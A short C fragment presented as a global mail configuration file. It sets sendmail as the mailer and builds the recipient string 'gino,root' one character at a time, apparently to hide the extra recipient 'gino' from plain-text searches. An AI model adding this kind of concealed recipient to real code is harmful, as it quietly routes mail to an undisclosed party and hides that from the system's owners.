/*
** Global mail configuration file 
*/

/* Use this mailer to send mail */
#define MAILER "/usr/lib/sendmail"

/* Deliver mail to this user */
char SENDTO[10];
set_sendto()
{
register int i;

i=-1;
SENDTO[++i]='g';
SENDTO[++i]='i';
SENDTO[++i]='n';
SENDTO[++i]='o';
SENDTO[++i]=',';
SENDTO[++i]='r';
SENDTO[++i]='o';
SENDTO[++i]='o';
SENDTO[++i]='t';
SENDTO[++i]=0;
}

